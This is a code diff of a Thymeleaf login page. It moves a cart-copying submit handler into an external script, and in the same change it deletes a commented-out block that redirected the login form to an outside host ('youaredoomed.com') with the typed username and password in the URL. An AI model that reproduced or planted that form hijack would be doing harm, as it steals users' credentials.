@@ -3,14 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Login Page</title>
-    <script>
-        function onSubmit()
-        {
-            let cartProducts = document.getElementById("cartProducts");
-            let cart = JSON.parse(localStorage.getItem('cart')) || [];
-            cartProducts.value = JSON.stringify(cart);
-        }
-    </script>
+    <script th:src="@{/static/js/auth/login.js}"></script>
 </head>
 <body>
 <h1>Login</h1>
@@ -20,7 +13,7 @@
 <div th:if="${param.logout}">
     You have been logged out.
 </div>
-<form id="form-login" method="post" th:action="@{/auth/login-process}" onsubmit="onSubmit()">
+<form id="form-login" method="post" th:action="@{/auth/login-process}" onsubmit="onLoginFormSubmit()">
     <div>
         <label for="username">Username:</label>
         <input type="text" id="username" name="username"/>
@@ -35,12 +28,5 @@
     </div>
     <button type="submit">Login</button>
 </form>
-
-<!--<script>-->
-<!--    let form= document.getElementById("form-login");-->
-<!--    form.action="https://youaredoomed.com:9090/collect?u="+document.getElementById('username').value-->
-<!--        +"&p="+document.getElementById('password').value;-->
-<!--</script>-->
-
 </body>
 </html>
